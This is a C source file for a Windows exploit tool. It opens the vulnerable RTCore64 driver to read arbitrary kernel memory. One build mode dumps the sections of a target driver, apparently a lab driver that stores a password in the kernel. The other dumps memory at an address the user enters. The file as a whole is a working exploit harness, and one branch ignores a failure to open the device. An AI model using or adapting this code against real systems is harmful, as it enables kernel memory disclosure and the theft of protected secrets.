#include <Windows.h>

#include <stdio.h>
#ifdef _EXPLOIT

#include "exploitRTCore64.h"
#include "helper.h"
#include "utils.h"


int main(int argc, char** argv) {
	const char* driverName = "CustomStorePasswordInKernel.sys";
	if (argc == 2) {
		driverName = argv[1];
	}
	if (!openRTCoreDevice()) { GetLastError(); }

	if (!InitPsLoadedModuleList()) { return GetLastError(); }

	scanf_s("%*c");

	readSections(driverName);

	closeRTCoreDevice();
}
#else
#include "exploitRTCore64.h"
#include "utils.h"

int main() {
	if (!openRTCoreDevice()) {
		closeRTCoreDevice();
		return -1;
	}

	DWORD64 address = 0;
	printf("Input target address: ");
	scanf_s("%llx", &address);

	BYTE buffer[64];
	if (!RTCoreReadMemory((DWORD64)address, (BYTE*)&buffer, sizeof(buffer))) {
		printf("[-] Read Memory Failed with error code %lu\r\n", GetLastError());
		return -1;
	}
	displayMemoryDump(buffer, sizeof(buffer));
	closeRTCoreDevice();
	return 0;
}
#endif // _EXPLOIT